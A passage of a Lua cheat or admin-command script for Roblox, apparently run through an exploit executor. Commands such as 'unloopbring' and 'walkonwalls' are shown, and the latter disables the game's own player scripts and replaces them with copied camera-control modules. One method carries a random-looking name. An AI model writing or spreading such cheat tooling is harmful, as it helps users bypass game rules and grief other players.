addcmd('unloopbring',{'noloopbring'},function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		spawn(function()
			for a,b in pairs(bringT) do if b == Players[v].Name then table.remove(bringT, a) end end
		end)
	end
end)

local walkto
addcmd('walkonwalls',{'wow'},function(args, speaker)
	--[[
local _p = game:WaitForChild("Players")
local _plr = _p.ChildAdded:Wait()
if _plr == _p.LocalPlayer then
	_plr.ChildAdded:Connect(function(cccc)
		if c.Name == "PlayerScriptsLoader" then
			c.Disabled = true
		end
	end)
end
]]
repeat wait()
a = pcall(function()
	game:WaitForChild("Players").LocalPlayer:WaitForChild("PlayerScripts").ChildAdded:Connect(function(c)
		if c.Name == "PlayerScriptsLoader"then
			c.Disabled = true
		end
	end)
	end)
	if a == true then break end
until true == false
game:WaitForChild("Players").LocalPlayer:WaitForChild("PlayerScripts").ChildAdded:Connect(function(c)
	if c.Name == "PlayerScriptsLoader"then
		c.Disabled = true
	end
end)


function _CameraUI()
	local Players = game:GetService("Players")
	local TweenService = game:GetService("TweenService")
	
	local LocalPlayer = Players.LocalPlayer
	if not LocalPlayer then
		Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
		LocalPlayer = Players.LocalPlayer
	end
	
	local function waitForChildOfClass(parent, class)
		local child = parent:FindFirstChildOfClass(class)
		while not child or child.ClassName ~= class do
			child = parent.ChildAdded:Wait()
		end
		return child
	end
	
	local PlayerGui = waitForChildOfClass(LocalPlayer, "PlayerGui")
	
	local TOAST_OPEN_SIZE = UDim2.new(0, 326, 0, 58)
	local TOAST_CLOSED_SIZE = UDim2.new(0, 80, 0, 58)
	local TOAST_BACKGROUND_COLOR = Color3.fromRGB(32, 32, 32)
	local TOAST_BACKGROUND_TRANS = 0.4
	local TOAST_FOREGROUND_COLOR = Color3.fromRGB(200, 200, 200)
	local TOAST_FOREGROUND_TRANS = 0
	
	-- Convenient syntax for creating a tree of instanes
	local function create(className)
		return function(props)
			local inst = Instance.new(className)
			local parent = props.Parent
			props.Parent = nil
			for name, val in pairs(props) do
				if type(name) == "string" then
					inst[name] = val
				else
					val.Parent = inst
				end
			end
			-- Only set parent after all other properties are initialized
			inst.Parent = parent
			return inst
		end
	end
	
	local initialized = false
	
	local uiRoot
	local toast
	local toastIcon
	local toastUpperText
	local toastLowerText
	
	local function initializeUI()
		assert(not initialized)
	
		uiRoot = create("ScreenGui"){
			Name = "RbxCameraUI",
			AutoLocalize = false,
			Enabled = true,
			DisplayOrder = -1, -- Appears behind default developer UI
			IgnoreGuiInset = false,
			ResetOnSpawn = false,
			ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
	
			create("ImageLabel"){
				Name = "Toast",
				Visible = false,
				AnchorPoint = Vector2.new(0.5, 0),
				BackgroundTransparency = 1,
				BorderSizePixel = 0,
				Position = UDim2.new(0.5, 0, 0, 8),
				Size = TOAST_CLOSED_SIZE,
				Image = "rbxasset://textures/ui/Camera/CameraToast9Slice.png",
				ImageColor3 = TOAST_BACKGROUND_COLOR,
				ImageRectSize = Vector2.new(6, 6),
				ImageTransparency = 1,
				ScaleType = Enum.ScaleType.Slice,
				SliceCenter = Rect.new(3, 3, 3, 3),
				ClipsDescendants = true,
	
				create("Frame"){
					Name = "IconBuffer",
					BackgroundTransparency = 1,
					BorderSizePixel = 0,
					Position = UDim2.new(0, 0, 0, 0),
					Size = UDim2.new(0, 80, 1, 0),
	
					create("ImageLabel"){
						Name = "Icon",
						AnchorPoint = Vector2.new(0.5, 0.5),
						BackgroundTransparency = 1,
						Position = UDim2.new(0.5, 0, 0.5, 0),
						Size = UDim2.new(0, 48, 0, 48),
						ZIndex = 2,
						Image = "rbxasset://textures/ui/Camera/CameraToastIcon.png",
						ImageColor3 = TOAST_FOREGROUND_COLOR,
						ImageTransparency = 1,
					}
				},
	
				create("Frame"){
					Name = "TextBuffer",
					BackgroundTransparency = 1,
					BorderSizePixel = 0,
					Position = UDim2.new(0, 80, 0, 0),
					Size = UDim2.new(1, -80, 1, 0),
					ClipsDescendants = true,
	
					create("TextLabel"){
						Name = "Upper",
						AnchorPoint = Vector2.new(0, 1),
						BackgroundTransparency = 1,
						Position = UDim2.new(0, 0, 0.5, 0),
						Size = UDim2.new(1, 0, 0, 19),
						Font = Enum.Font.GothamSemibold,
						Text = "Camera control enabled",
						TextColor3 = TOAST_FOREGROUND_COLOR,
						TextTransparency = 1,
						TextSize = 19,
						TextXAlignment = Enum.TextXAlignment.Left,
						TextYAlignment = Enum.TextYAlignment.Center,
					},
	
					create("TextLabel"){
						Name = "Lower",
						AnchorPoint = Vector2.new(0, 0),
						BackgroundTransparency = 1,
						Position = UDim2.new(0, 0, 0.5, 3),
						Size = UDim2.new(1, 0, 0, 15),
						Font = Enum.Font.Gotham,
						Text = "Right mouse button to toggle",
						TextColor3 = TOAST_FOREGROUND_COLOR,
						TextTransparency = 1,
						TextSize = 15,
						TextXAlignment = Enum.TextXAlignment.Left,
						TextYAlignment = Enum.TextYAlignment.Center,
					},
				},
			},
	
			Parent = PlayerGui,
		}
	
		toast = uiRoot.Toast
		toastIcon = toast.IconBuffer.Icon
		toastUpperText = toast.TextBuffer.Upper
		toastLowerText = toast.TextBuffer.Lower
	
		initialized = true
	end
	
	local CameraUI = {}
	
	do
		-- Instantaneously disable the toast or enable for opening later on. Used when switching camera modes.
		function CameraUI.setCameraModeToastEnabled(enabled)
			if not enabled and not initialized then
				return
			end
	
			if not initialized then
				initializeUI()
			end
	
			toast.Visible = enabled
			if not enabled then
				CameraUI.setCameraModeToastOpen(false)
			end
		end
	
		local tweenInfo = TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	
		-- Tween the toast in or out. Toast must be enabled with setCameraModeToastEnabled.
		function CameraUI.setCameraModeToastOpen(open)
			assert(initialized)
	
			TweenService:Create(toast, tweenInfo, {
				Size = open and TOAST_OPEN_SIZE or TOAST_CLOSED_SIZE,
				ImageTransparency = open and TOAST_BACKGROUND_TRANS or 1,
			}):Play()
	
			TweenService:Create(toastIcon, tweenInfo, {
				ImageTransparency = open and TOAST_FOREGROUND_TRANS or 1,
			}):Play()
	
			TweenService:Create(toastUpperText, tweenInfo, {
				TextTransparency = open and TOAST_FOREGROUND_TRANS or 1,
			}):Play()
	
			TweenService:Create(toastLowerText, tweenInfo, {
				TextTransparency = open and TOAST_FOREGROUND_TRANS or 1,
			}):Play()
		end
	end
	
	return CameraUI
end

function _CameraToggleStateController()
	local Players = game:GetService("Players")
	local UserInputService = game:GetService("UserInputService")
	local GameSettings = UserSettings():GetService("UserGameSettings")
	
	local LocalPlayer = Players.LocalPlayer
	if not LocalPlayer then
		Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
		LocalPlayer = Players.LocalPlayer
	end
	
	local Mouse = LocalPlayer:GetMouse()
	
	local Input = _CameraInput()
	local CameraUI = _CameraUI()
	
	local lastTogglePan = false
	local lastTogglePanChange = tick()
	
	local CROSS_MOUSE_ICON = "rbxasset://textures/Cursors/CrossMouseIcon.png"
	
	local lockStateDirty = false
	local wasTogglePanOnTheLastTimeYouWentIntoFirstPerson = false
	local lastFirstPerson = false
	
	CameraUI.setCameraModeToastEnabled(false)
	
	return function(isFirstPerson)
		local togglePan = Input.getTogglePan()
		local toastTimeout = 3
	
		if isFirstPerson and togglePan ~= lastTogglePan then
			lockStateDirty = true
		end
	
		if lastTogglePan ~= togglePan or tick() - lastTogglePanChange > toastTimeout then
			local doShow = togglePan and tick() - lastTogglePanChange < toastTimeout
	
			CameraUI.setCameraModeToastOpen(doShow)
	
			if togglePan then
				lockStateDirty = false
			end
			lastTogglePanChange = tick()
			lastTogglePan = togglePan
		end
	
		if isFirstPerson ~= lastFirstPerson then
			if isFirstPerson then
				wasTogglePanOnTheLastTimeYouWentIntoFirstPerson = Input.getTogglePan()
				Input.setTogglePan(true)
			elseif not lockStateDirty then
				Input.setTogglePan(wasTogglePanOnTheLastTimeYouWentIntoFirstPerson)
			end
		end
	
		if isFirstPerson then
			if Input.getTogglePan() then
				Mouse.Icon = CROSS_MOUSE_ICON
				UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
				--GameSettings.RotationType = Enum.RotationType.CameraRelative
			else
				Mouse.Icon = ""
				UserInputService.MouseBehavior = Enum.MouseBehavior.Default
				--GameSettings.RotationType = Enum.RotationType.CameraRelative
			end
	
		elseif Input.getTogglePan() then
			Mouse.Icon = CROSS_MOUSE_ICON
			UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
			GameSettings.RotationType = Enum.RotationType.MovementRelative
	
		elseif Input.getHoldPan() then
			Mouse.Icon = ""
			UserInputService.MouseBehavior = Enum.MouseBehavior.LockCurrentPosition
			GameSettings.RotationType = Enum.RotationType.MovementRelative
	
		else
			Mouse.Icon = ""
			UserInputService.MouseBehavior = Enum.MouseBehavior.Default
			GameSettings.RotationType = Enum.RotationType.MovementRelative
		end
	
		lastFirstPerson = isFirstPerson
	end
end

function _CameraInput()
	local UserInputService = game:GetService("UserInputService")
	
	local MB_TAP_LENGTH = 0.3 -- length of time for a short mouse button tap to be registered
	
	local rmbDown, rmbUp
	do
		local rmbDownBindable = Instance.new("BindableEvent")
		local rmbUpBindable = Instance.new("BindableEvent")
	
		rmbDown = rmbDownBindable.Event
		rmbUp = rmbUpBindable.Event
	
		UserInputService.InputBegan:Connect(function(input, gpe)
			if not gpe and input.UserInputType == Enum.UserInputType.MouseButton2 then
				rmbDownBindable:Fire()
			end
		end)
	
		UserInputService.InputEnded:Connect(function(input, gpe)
			if input.UserInputType == Enum.UserInputType.MouseButton2 then
				rmbUpBindable:Fire()
			end
		end)
	end
	
	local holdPan = false
	local togglePan = false
	local lastRmbDown = 0 -- tick() timestamp of the last right mouse button down event
	
	local CameraInput = {}
	
	function CameraInput.getHoldPan()
		return holdPan
	end
	
	function CameraInput.getTogglePan()
		return togglePan
	end
	
	function CameraInput.getPanning()
		return togglePan or holdPan
	end
	
	function CameraInput.setTogglePan(value)
		togglePan = value
	end
	
	local cameraToggleInputEnabled = false
	local rmbDownConnection
	local rmbUpConnection
	
	function CameraInput.enableCameraToggleInput()
		if cameraToggleInputEnabled then
			return
		end
		cameraToggleInputEnabled = true
	
		holdPan = false
		togglePan = false
	
		if rmbDownConnection then
			rmbDownConnection:Disconnect()
		end
	
		if rmbUpConnection then
			rmbUpConnection:Disconnect()
		end
	
		rmbDownConnection = rmbDown:Connect(function()
			holdPan = true
			lastRmbDown = tick()
		end)
	
		rmbUpConnection = rmbUp:Connect(function()
			holdPan = false
			if tick() - lastRmbDown < MB_TAP_LENGTH and (togglePan or UserInputService:GetMouseDelta().Magnitude < 2) then
				togglePan = not togglePan
			end
		end)
	end
	
	function CameraInput.disableCameraToggleInput()
		if not cameraToggleInputEnabled then
			return
		end
		cameraToggleInputEnabled = false
	
		if rmbDownConnection then
			rmbDownConnection:Disconnect()
			rmbDownConnection = nil
		end
		if rmbUpConnection then
			rmbUpConnection:Disconnect()
			rmbUpConnection = nil
		end
	end
	
	return CameraInput
end

function _BaseCamera()
	--[[
		BaseCamera - Abstract base class for camera control modules
		2018 Camera Update - AllYourBlox
	--]]
	
	--[[ Local Constants ]]--
	local UNIT_Z = Vector3.new(0,0,1)
	local X1_Y0_Z1 = Vector3.new(1,0,1)	--Note: not a unit vector, used for projecting onto XZ plane
	
	local THUMBSTICK_DEADZONE = 0.2
	local DEFAULT_DISTANCE = 12.5	-- Studs
	local PORTRAIT_DEFAULT_DISTANCE = 25		-- Studs
	local FIRST_PERSON_DISTANCE_THRESHOLD = 1.0 -- Below this value, snap into first person
	
	local CAMERA_ACTION_PRIORITY = Enum.ContextActionPriority.Default.Value
	
	-- Note: DotProduct check in CoordinateFrame::lookAt() prevents using values within about
	-- 8.11 degrees of the +/- Y axis, that's why these limits are currently 80 degrees
	local MIN_Y = math.rad(-80)
	local MAX_Y = math.rad(80)
	
	local TOUCH_ADJUST_AREA_UP = math.rad(30)
	local TOUCH_ADJUST_AREA_DOWN = math.rad(-15)
	
	local TOUCH_SENSITIVTY_ADJUST_MAX_Y = 2.1
	local TOUCH_SENSITIVTY_ADJUST_MIN_Y = 0.5
	
	local VR_ANGLE = math.rad(15)
	local VR_LOW_INTENSITY_ROTATION = Vector2.new(math.rad(15), 0)
	local VR_HIGH_INTENSITY_ROTATION = Vector2.new(math.rad(45), 0)
	local VR_LOW_INTENSITY_REPEAT = 0.1
	local VR_HIGH_INTENSITY_REPEAT = 0.4
	
	local ZERO_VECTOR2 = Vector2.new(0,0)
	local ZERO_VECTOR3 = Vector3.new(0,0,0)
	
	local TOUCH_SENSITIVTY = Vector2.new(0.00945 * math.pi, 0.003375 * math.pi)
	local MOUSE_SENSITIVITY = Vector2.new( 0.002 * math.pi, 0.0015 * math.pi )
	
	local SEAT_OFFSET = Vector3.new(0,5,0)
	local VR_SEAT_OFFSET = Vector3.new(0,4,0)
	local HEAD_OFFSET = Vector3.new(0,1.5,0)
	local R15_HEAD_OFFSET = Vector3.new(0, 1.5, 0)
	local R15_HEAD_OFFSET_NO_SCALING = Vector3.new(0, 2, 0)
	local HUMANOID_ROOT_PART_SIZE = Vector3.new(2, 2, 1)
	
	local GAMEPAD_ZOOM_STEP_1 = 0
	local GAMEPAD_ZOOM_STEP_2 = 10
	local GAMEPAD_ZOOM_STEP_3 = 20
	
	local PAN_SENSITIVITY = 20
	local ZOOM_SENSITIVITY_CURVATURE = 0.5
	
	local abs = math.abs
	local sign = math.sign
	
	local FFlagUserCameraToggle do
		local success, result = pcall(function()
			return UserSettings():IsUserFeatureEnabled("UserCameraToggle")
		end)
		FFlagUserCameraToggle = success and result
	end
	
	local FFlagUserDontAdjustSensitvityForPortrait do
		local success, result = pcall(function()
			return UserSettings():IsUserFeatureEnabled("UserDontAdjustSensitvityForPortrait")
		end)
		FFlagUserDontAdjustSensitvityForPortrait = success and result
	end
	
	local FFlagUserFixZoomInZoomOutDiscrepancy do
		local success, result = pcall(function()
			return UserSettings():IsUserFeatureEnabled("UserFixZoomInZoomOutDiscrepancy")
		end)
		FFlagUserFixZoomInZoomOutDiscrepancy = success and result
	end
	
	local Util = _CameraUtils()
	local ZoomController = _ZoomController()
	local CameraToggleStateController = _CameraToggleStateController()
	local CameraInput = _CameraInput()
	local CameraUI = _CameraUI()
	
	--[[ Roblox Services ]]--
	local Players = game:GetService("Players")
	local UserInputService = game:GetService("UserInputService")
	local StarterGui = game:GetService("StarterGui")
	local GuiService = game:GetService("GuiService")
	local ContextActionService = game:GetService("ContextActionService")
	local VRService = game:GetService("VRService")
	local UserGameSettings = UserSettings():GetService("UserGameSettings")
	
	local player = Players.LocalPlayer 
	
	--[[ The Module ]]--
	local BaseCamera = {}
	BaseCamera.__index = BaseCamera
	
	function BaseCamera.new()
		local self = setmetatable({}, BaseCamera)
	
		-- So that derived classes have access to this
		self.FIRST_PERSON_DISTANCE_THRESHOLD = FIRST_PERSON_DISTANCE_THRESHOLD
	
		self.cameraType = nil
		self.cameraMovementMode = nil
	
		self.lastCameraTransform = nil
		self.rotateInput = ZERO_VECTOR2
		self.userPanningCamera = false
		self.lastUserPanCamera = tick()
	
		self.humanoidRootPart = nil
		self.humanoidCache = {}
	
		-- Subject and position on last update call
		self.lastSubject = nil
		self.lastSubjectPosition = Vector3.new(0,5,0)
	
		-- These subject distance members refer to the nominal camera-to-subject follow distance that the camera
		-- is trying to maintain, not the actual measured value.
		-- The default is updated when screen orientation or the min/max distances change,
		-- to be sure the default is always in range and appropriate for the orientation.
		self.defaultSubjectDistance = math.clamp(DEFAULT_DISTANCE, player.CameraMinZoomDistance, player.CameraMaxZoomDistance)
		self.currentSubjectDistance = math.clamp(DEFAULT_DISTANCE, player.CameraMinZoomDistance, player.CameraMaxZoomDistance)
	
		self.inFirstPerson = false
		self.inMouseLockedMode = false
		self.portraitMode = false
		self.isSmallTouchScreen = false
	
		-- Used by modules which want to reset the camera angle on respawn.
		self.resetCameraAngle = true
	
		self.enabled = false
	
		-- Input Event Connections
		self.inputBeganConn = nil
		self.inputChangedConn = nil
		self.inputEndedConn = nil
	
		self.startPos = nil
		self.lastPos = nil
		self.panBeginLook = nil
	
		self.panEnabled = true
		self.keyPanEnabled = true
		self.distanceChangeEnabled = true
	
		self.PlayerGui = nil
	
		self.cameraChangedConn = nil
		self.viewportSizeChangedConn = nil
	
		self.boundContextActions = {}
	
		-- VR Support
		self.shouldUseVRRotation = false
		self.VRRotationIntensityAvailable = false
		self.lastVRRotationIntensityCheckTime = 0
		self.lastVRRotationTime = 0
		self.vrRotateKeyCooldown = {}
		self.cameraTranslationConstraints = Vector3.new(1, 1, 1)
		self.humanoidJumpOrigin = nil
		self.trackingHumanoid = nil
		self.cameraFrozen = false
		self.subjectStateChangedConn = nil
	
		-- Gamepad support
		self.activeGamepad = nil
		self.gamepadPanningCamera = false
		self.lastThumbstickRotate = nil
		self.numOfSeconds = 0.7
		self.currentSpeed = 0
		self.maxSpeed = 6
		self.vrMaxSpeed = 4
		self.lastThumbstickPos = Vector2.new(0,0)
		self.ySensitivity = 0.65
		self.lastVelocity = nil
		self.gamepadConnectedConn = nil
		self.gamepadDisconnectedConn = nil
		self.currentZoomSpeed = 1.0
		self.L3ButtonDown = false
		self.dpadLeftDown = false
		self.dpadRightDown = false
	
		-- Touch input support
		self.isDynamicThumbstickEnabled = false
		self.fingerTouches = {}
		self.dynamicTouchInput = nil
		self.numUnsunkTouches = 0
		self.inputStartPositions = {}
		self.inputStartTimes = {}
		self.startingDiff = nil
		self.pinchBeginZoom = nil
		self.userPanningTheCamera = false
		self.touchActivateConn = nil
	
		-- Mouse locked formerly known as shift lock mode
		self.mouseLockOffset = ZERO_VECTOR3
	
		-- [[ NOTICE ]] --
		-- Initialization things used to always execute at game load time, but now these camera modules are instantiated
		-- when needed, so the code here may run well after the start of the game
	
		if player.Character then
			self:OnCharacterAdded(player.Character)
		end
	
		player.CharacterAdded:Connect(function(char)
			self:OnCharacterAdded(char)
		end)
	
		if self.cameraChangedConn then self.cameraChangedConn:Disconnect() end
		self.cameraChangedConn = workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
			self:OnCurrentCameraChanged()
		end)
		self:OnCurrentCameraChanged()
	
		if self.playerCameraModeChangeConn then self.playerCameraModeChangeConn:Disconnect() end
		self.playerCameraModeChangeConn = player:GetPropertyChangedSignal("CameraMode"):Connect(function()
			self:OnPlayerCameraPropertyChange()
		end)
	
		if self.minDistanceChangeConn then self.minDistanceChangeConn:Disconnect() end
		self.minDistanceChangeConn = player:GetPropertyChangedSignal("CameraMinZoomDistance"):Connect(function()
			self:OnPlayerCameraPropertyChange()
		end)
	
		if self.maxDistanceChangeConn then self.maxDistanceChangeConn:Disconnect() end
		self.maxDistanceChangeConn = player:GetPropertyChangedSignal("CameraMaxZoomDistance"):Connect(function()
			self:OnPlayerCameraPropertyChange()
		end)
	
		if self.playerDevTouchMoveModeChangeConn then self.playerDevTouchMoveModeChangeConn:Disconnect() end
		self.playerDevTouchMoveModeChangeConn = player:GetPropertyChangedSignal("DevTouchMovementMode"):Connect(function()
			self:OnDevTouchMovementModeChanged()
		end)
		self:OnDevTouchMovementModeChanged() -- Init
	
		if self.gameSettingsTouchMoveMoveChangeConn then self.gameSettingsTouchMoveMoveChangeConn:Disconnect() end
		self.gameSettingsTouchMoveMoveChangeConn = UserGameSettings:GetPropertyChangedSignal("TouchMovementMode"):Connect(function()
			self:OnGLgeXLfQwRZUKwZ8oYDpecM3TBxgTwUfmuGd()
		end)
		self:OnGLgeXLfQwRZUKwZ8oYDpecM3TBxgTwUfmuGd() -- Init
	
		UserGameSettings:SetCameraYInvertVisible()
		UserGameSettings:SetGamepadCameraSensitivityVisible()
	
		self.hasGameLoaded = game:IsLoaded()
		if not self.hasGameLoaded then
			self.gameLoadedConn = game.Loaded:Connect(function()
				self.hasGameLoaded = true
				self.gameLoadedConn:Disconnect()
				self.gameLoadedConn = nil
			end)
		end
	
		self:OnPlayerCameraPropertyChange()
	
		return self
	end
	
	function BaseCamera:GetModuleName()
		return "BaseCamera"
	end
	
	function BaseCamera:OnCharacterAdded(char)
		self.resetCameraAngle = self.resetCameraAngle or self:GetEnabled()
		self.humanoidRootPart = nil
		if UserInputService.TouchEnabled then
			self.PlayerGui = player:WaitForChild("PlayerGui")
			for _, child in ipairs(char:GetChildren()) do
				if child:IsA("Tool") then
					self.isAToolEquipped = true
				end
			end
			char.ChildAdded:Connect(function(child)
				if child:IsA("Tool") then
					self.isAToolEquipped = true
				end
			end)
			char.ChildRemoved:Connect(function(child)
				if child:IsA("Tool") then
					self.isAToolEquipped = false
				end
			end)
		end
	end
	
	function BaseCamera:GetHumanoidRootPart()
		if not self.humanoidRootPart then
			if player.Character then
				local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
				if humanoid then
					self.humanoidRootPart = humanoid.RootPart
				end
			end
		end
		return self.humanoidRootPart
	end
	
	function BaseCamera:GetBodyPartToFollow(humanoid, isDead)
		-- If the humanoid is dead, prefer the head part if one still exists as a sibling of the humanoid
		if humanoid:GetState() == Enum.HumanoidStateType.Dead then
			local character = humanoid.Parent
			if character and character:IsA("Model") then
				return character:FindFirstChild("Head") or humanoid.RootPart
			end
		end
	
		return humanoid.RootPart
	end
	
	function BaseCamera:GetSubjectPosition()
		local result = self.lastSubjectPosition
		local camera = game.Workspace.CurrentCamera
		local cameraSubject = camera and camera.CameraSubject
	
		if cameraSubject then
			if cameraSubject:IsA("Humanoid") then
				local humanoid = cameraSubject
				local humanoidIsDead = humanoid:GetState() == Enum.HumanoidStateType.Dead
	
				if VRService.VREnabled and humanoidIsDead and humanoid == self.lastSubject then
					result = self.lastSubjectPosition
				else
					local bodyPartToFollow = humanoid.RootPart
	
					-- If the humanoid is dead, prefer their head part as a follow target, if it exists
					if humanoidIsDead then
						if humanoid.Parent and humanoid.Parent:IsA("Model") then
							bodyPartToFollow = humanoid.Parent:FindFirstChild("Head") or bodyPartToFollow
						end
					end
	
					if bodyPartToFollow and bodyPartToFollow:IsA("BasePart") then
						local heightOffset
						if humanoid.RigType == Enum.HumanoidRigType.R15 then
							if humanoid.AutomaticScalingEnabled then
								heightOffset = R15_HEAD_OFFSET
								if bodyPartToFollow == humanoid.RootPart then
									local rootPartSizeOffset = (humanoid.RootPart.Size.Y/2) - (HUMANOID_ROOT_PART_SIZE.Y/2)
									heightOffset = heightOffset + Vector3.new(0, rootPartSizeOffset, 0)
								end
							else
								heightOffset = R15_HEAD_OFFSET_NO_SCALING
							end
						else
							heightOffset = HEAD_OFFSET
						end
	
						if humanoidIsDead then
							heightOffset = ZERO_VECTOR3
						end
	
						result = bodyPartToFollow.CFrame.p + bodyPartToFollow.CFrame:vectorToWorldSpace(heightOffset + humanoid.CameraOffset)
					end
				end
	
			elseif cameraSubject:IsA("VehicleSeat") then
				local offset = SEAT_OFFSET
				if VRService.VREnabled then
					offset = VR_SEAT_OFFSET
				end
				result = cameraSubject.CFrame.p + cameraSubject.CFrame:vectorToWorldSpace(offset)
			elseif cameraSubject:IsA("SkateboardPlatform") then
				result = cameraSubject.CFrame.p + SEAT_OFFSET
			elseif cameraSubject:IsA("BasePart") then
				result = cameraSubject.CFrame.p
			elseif cameraSubject:IsA("Model") then
				if cameraSubject.PrimaryPart then
					result = cameraSubject:GetPrimaryPartCFrame().p
				else
					result = cameraSubject:GetModelCFrame().p
				end
			end
		else
			-- cameraSubject is nil
			-- Note: Previous RootCamera did not have this else case and let self.lastSubject and self.lastSubjectPosition
			-- both get set to nil in the case of cameraSubject being nil. This function now exits here to preserve the
			-- last set valid values for these, as nil values are not handled cases
			return
		end
	
		self.lastSubject = cameraSubject
		self.lastSubjectPosition = result
	
		return result
	end
	
	function BaseCamera:UpdateDefaultSubjectDistance()
		if self.portraitMode then
			self.defaultSubjectDistance = math.clamp(PORTRAIT_DEFAULT_DISTANCE, player.CameraMinZoomDistance, player.CameraMaxZoomDistance)
		else
			self.defaultSubjectDistance = math.clamp(DEFAULT_DISTANCE, player.CameraMinZoomDistance, player.CameraMaxZoomDistance)
		end
	end
	
	function BaseCamera:OnViewportSizeChanged()
		local camera = game.Workspace.CurrentCamera
		local size = camera.ViewportSize
		self.portraitMode = size.X < size.Y
		self.isSmallTouchScreen = UserInputService.TouchEnabled and (size.Y < 500 or size.X < 700)
	
		self:UpdateDefaultSubjectDistance()
	end
	
	-- Listener for changes to workspace.CurrentCamera
	function BaseCamera:OnCurrentCameraChanged()
		if UserInputService.TouchEnabled then
			if self.viewportSizeChangedConn then
				self.viewportSizeChangedConn:Disconnect()
				self.viewportSizeChangedConn = nil
			end
	
			local newCamera = game.Workspace.CurrentCamera
	
			if newCamera then
				self:OnViewportSizeChanged()
				self.viewportSizeChangedConn = newCamera:GetPropertyChangedSignal("ViewportSize"):Connect(function()
					self:OnViewportSizeChanged()
				end)
			end
		end
	
		-- VR support additions
		if self.cameraSubjectChangedConn then
			self.cameraSubjectChangedConn:Disconnect()
			self.cameraSubjectChangedConn = nil
		end
	
		local camera = game.Workspace.CurrentCamera
		if camera then
			self.cameraSubjectChangedConn = camera:GetPropertyChangedSignal("CameraSubject"):Connect(function()
				self:OnNewCameraSubject()
			end)
			self:OnNewCameraSubject()
		end
	end
	
	function BaseCamera:OnDynamicThumbstickEnabled()
		if UserInputService.TouchEnabled then
			self.isDynamicThumbstickEnabled = true
		end
	end
	
	function BaseCamera:OnDynamicThumbstickDisabled()
		self.isDynamicThumbstickEnabled = false
	end
	
	function BaseCamera:OnGLgeXLfQwRZUKwZ8oYDpecM3TBxgTwUfmuGd()
		if player.DevTouchMovementMode == Enum.DevTouchMovementMode.UserChoice then
			if (UserGameSettings.TouchMovementMode == Enum.TouchMovementMode.DynamicThumbstick
				or UserGameSettings.TouchMovementMode == Enum.TouchMovementMode.Default) then
				self:OnDynamicThumbstickEnabled()
			else
				self:OnDynamicThumbstickDisabled()
			end
		end
	end
	
	function BaseCamera:OnDevTouchMovementModeChanged()
		if player.DevTouchMovementMode.Name == "DynamicThumbstick" then
			self:OnDynamicThumbstickEnabled()
		else
			self:OnGLgeXLfQwRZUKwZ8oYDpecM3TBxgTwUfmuGd()
		end
	end
	
	function BaseCamera:OnPlayerCameraPropertyChange()
		-- This call forces re-evaluation of player.CameraMode and clamping to min/max distance which may have changed
		self:SetCameraToSubjectDistance(self.currentSubjectDistance)
	end
	
	function BaseCamera:GetCameraHeight()
		if VRService.VREnabled and not self.inFirstPerson then
			return math.sin(VR_ANGLE) * self.currentSubjectDistance
		end
		return 0
	end
	
	function BaseCamera:InputTranslationToCameraAngleChange(translationVector, sensitivity)
		if not FFlagUserDontAdjustSensitvityForPortrait then
			local camera = game.Workspace.CurrentCamera
			if camera and camera.ViewportSize.X > 0 and camera.ViewportSize.Y > 0 and (camera.ViewportSize.Y > camera.ViewportSize.X) then
				-- Screen has portrait orientation, swap X and Y sensitivity
				return translationVector * Vector2.new( sensitivity.Y, sensitivity.X)
			end
		end
		return translationVector * sensitivity
	end
	
	function BaseCamera:Enable(enable)
		if self.enabled ~= enable then
			self.enabled = enable
			if self.enabled then
				self:ConnectInputEvents()
				self:BindContextActions()
	
				if player.CameraMode == Enum.CameraMode.LockFirstPerson then
					self.currentSubjectDistance = 0.5
					if not self.inFirstPerson then
						self:EnterFirstPerson()
					end
				end
			else
				self:DisconnectInputEvents()
				self:UnbindContextActions()
				-- Clean up additional event listeners and reset a bunch of properties
				self:Cleanup()
			end
		end
	end
	
	function BaseCamera:GetEnabled()
		return self.enabled
	end
	
	function BaseCamera:OnInputBegan(input, processed)
		if input.UserInputType == Enum.UserInputType.Touch then
			self:OnTouchBegan(input, processed)
		elseif input.UserInputType == Enum.UserInputType.MouseButton2 then
			self:OnMouse2Down(input, processed)
		elseif input.UserInputType == Enum.UserInputType.MouseButton3 then
			self:OnMouse3Down(input, processed)
		end
	end
	
	function BaseCamera:OnInputChanged(input, processed)
		if input.UserInputType == Enum.UserInputType.Touch then
			self:OnTouchChanged(input, processed)
		elseif input.UserInputType == Enum.UserInputType.MouseMovement then
			self:OnMouseMoved(input, processed)
		end
	end
	
	function BaseCamera:OnInputEnded(input, processed)
		if input.UserInputType == Enum.UserInputType.Touch then
			self:OnTouchEnded(input, processed)
		elseif input.UserInputType == Enum.UserInputType.MouseButton2 then
			self:OnMouse2Up(input, processed)
		elseif input.UserInputType == Enum.UserInputType.MouseButton3 then
			self:OnMouse3Up(input, processed)
		end
	end
	
	function BaseCamera:OnPointerAction(wheel, pan, pinch, processed)
		if processed then
			return
		end
	
		if pan.Magnitude > 0 then
			local inversionVector = Vector2.new(1, UserGameSettings:GetCameraYInvertValue())
			local rotateDelta = self:InputTranslationToCameraAngleChange(PAN_SENSITIVITY*pan, MOUSE_SENSITIVITY)*inversionVector
			self.rotateInput = self.rotateInput + rotateDelta
		end
	
		local zoom = self.currentSubjectDistance
		local zoomDelta = -(wheel + pinch)
	
		if abs(zoomDelta) > 0 then
			local newZoom
			if self.inFirstPerson and zoomDelta > 0 then
				newZoom = FIRST_PERSON_DISTANCE_THRESHOLD
			else
				if FFlagUserFixZoomInZoomOutDiscrepancy then
					if (zoomDelta > 0) then
						newZoom = zoom + zoomDelta*(1 + zoom*ZOOM_SENSITIVITY_CURVATURE)
					else
						newZoom = (zoom + zoomDelta) / (1 - zoomDelta*ZOOM_SENSITIVITY_CURVATURE)
					end
				else
					newZoom = zoom + zoomDelta*(1 + zoom*ZOOM_SENSITIVITY_CURVATURE)
				end
			end
	
			self:SetCameraToSubjectDistance(newZoom)
		end
	end
	
	function BaseCamera:ConnectInputEvents()
		self.pointerActionConn = UserInputService.PointerAction:Connect(function(wheel, pan, pinch, processed)
